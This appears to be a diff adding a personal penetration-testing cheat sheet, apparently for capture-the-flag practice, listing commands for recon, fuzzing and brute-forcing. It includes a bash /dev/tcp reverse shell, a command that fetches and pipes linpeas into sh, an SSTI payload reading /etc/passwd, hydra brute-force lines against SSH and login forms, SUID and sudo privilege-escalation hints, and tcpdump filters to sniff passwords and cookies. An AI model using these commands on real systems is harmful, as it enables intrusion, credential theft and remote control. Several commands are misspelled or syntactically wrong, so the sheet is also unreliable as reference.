@@ -1,0 +1,147 @@
+Nslookup  #get the ip Eg: nslookup google.com
+Netdiscover  #ip amd mac of devices connected to the network 
+uncover -q “target.com” -e censys,fofa,shodan,shodan-idb | httpx | tee ips.txt
+wget https://site.com | grep "< a href=\"http" | grep "site.com"
+
+#port enumeration (-f:to run fatser,  T4 run faster) 
+
+ 	     nmap -p-  #all port
+       nmap -sV   #syn-version detection
+       nmap -o #os discovery
+ 	     nmap -vv # verbos 
+       nmap –traceroute  #to find missed packets
+       nmap -sZ -v #SCTP cookie echo
+       nmap -V #version
+       nmap -PA (tcp packets) -sT (tcp port)
+       nmap -PU (udp packets) -sU(udp port)
+       nmap -PE (icmp packets)
+       namp -sn -PE (icmp host)
+       nmap -f (invade firewall)
+       nmap -A (aggressive )
+       namp -p 1- 100 (specified range)
+       nNmap -sC (script in the web)
+       nmap –script vuln (vuln scripts)
+       nmap --script=ssl-enum-ciphers
+       namp -sn (host)
+
+
+#dowl a file 
+       wget http://ip/filename
+       curl http://ip/filname.sh
+
+#directory enumeration      
+       gobuster -dir -u http://url/ -w path of file
+       wpscan –url http://
+       wfuzz -u http://shoppy.htb/ -H "Host: FUZZ.shoppy.htb" -w /home/kali/workspace/tools/SecLists/Discovery/DNS/subdomains-top1million-110000.txt  --sc 200 
+       feroxbuster -u http://shoppy.htb/ -w /home/kali/workspace/tools/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
+
+#subdomain enumeration 
+       gobuster vhost -u http://url/ -w path
+       dig ip@url axpr                    
+       ffuf -u “https://FUZZ.target.com" -w <path_to_wordlist> -mc 200,301,302,403         
+
+#bruteforce
+       hydra    -l guest                       -P fnal.txt                          ip ssh
+          [username / L -username file]   [-p single pass file of paaswords]                          ]                   
+       hydra  -l    -p  http-get /hidden/ [server based auth]    
+       hydra  -l   -p domainname http-post-form “[reffer] :tfUName=^USER^&tfUPass=^PASS^:S=logout” -vV -f [form based auth]
+       wpscan –url  http://    --usernames  use.txt   --passwords pass.txt  [wordpres]
+      
+#john_the_ripper
+      john –wordlist = /usr/share/wordlsts/rockyou.txt –format =  [type of encry.]  [file]
+      john filename /usr/share/wordlists/rockyou.txt
+
+#hashcat
+      hashcat -m [mode] filename /usr/share/wordlists/rockyou.txt
+
+#reverse shell
+      bash -i >&  /dev/tcp/ip/port 0>&1
+
+#DNS Zone transfer
+      dig axpr@ip domainname
+
+#Python shell spawn
+      python3 -c " import pty; pty.spawn ('/bin/bash')"
+
+#Shell find command
+      find / -type f -name "flag" -exec ls -l {} + 2>/dev/null 
+      find / - perm -u=s 2>/dev/null
+      find / -user root -perm -4000
+      find / -perm -4000 2>/dev/null
+
+#ssh port forwarding
+      ssh localport:remoteip:remoteport 
+
+# Linux export command 
+       export PATH=$PATH
+       export Path=/usr/bin:$PATH
+
+#ssti payloads
+      {{config.class.init.globals['os'].popen(“cat/etc/passwd”).read()}}
+
+#ssh
+    ssh username@ip
+    ssh -I id_rsa name@ip         #(ssh key)
+    ssh-Keygen   #(generate ssh key)
+    Upload id_rsa.pub and take connection using id_rsa (chmod +600)
+
+#vulnerable
+      sudo :  sudoedit -s Y
+       screen : screen -X root/root
+
+#curl
+       pyhton3 -m http.server 80
+       curl http://ip/linepeas.sh | sh
+       
+#reconassence
+      sublister -d domainname
+      theHarvester -d
+      crt.sh
+      nikto -h http://www.
+
+#find
+     find / -perm -u=s 2>/dev/null
+     find / -user root -perm -4000
+     find / -perm -4000 2>/dev/null
+    
+#tips and tricks
+          Cat filename | grep sh$   #show users only from /etc/passwd   
+
+#Footprinting
+       Website-Watcher 
+       Bookmark-new webpage  (open pages)
+       Buitwith.com (site)
+       Whatweb /domain name
+       Whois domain name
+       Apnic – find ip block
+       Dnsdumpster.com 
+
+#email footprinting
+       Haveibeenpwned.com – to check whether the emailed is been pwned
+       Infoga 
+
+#tcpdump
+    capture http password
+              tcpdump -s O -A -n -l |egrep -I “POST /|pwd=|passwd=|password=|tfUname|Host:”
+    capture cookie 
+              tcpdump -nn -A -sO -l | egrep -I “Set-Cookie|Host:|Cookie:”
+    capture ftp cred
+              tcpdump -e |eth0 | grep PASS
+    capture all passwords
+              sudo tcpdump port http or port ftp or port smtp or port imap or port pop3 or port telnet -I -A | egrep -I – 85
+              ‘pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|username:|password:|login:|pass|user’
+
+    DHCP exam
+            tcpdump -v -n port 67or port 68
+    capture on protocol
+            tcpdump -I eth0 udp
+    capture host based on ip
+            tcpdump -I eth0 host [ip]
+    extract http user agent
+            tcpdump -nn -A -s1500 -i|grep “User-Agent:”
+    capture only http get and post packets
+            tcpdump -s 0 -A -vv ‘tcp[((tcp[12:1] & 0xf0) >> 2):4 = 0x47455420
+    extract HTTP req url’s
+            tcpdump -s 0 -v -n -l|egrep -I “POST /|GET /|Host:”
+
+users in /etc/passwd : cat filename | grep bash
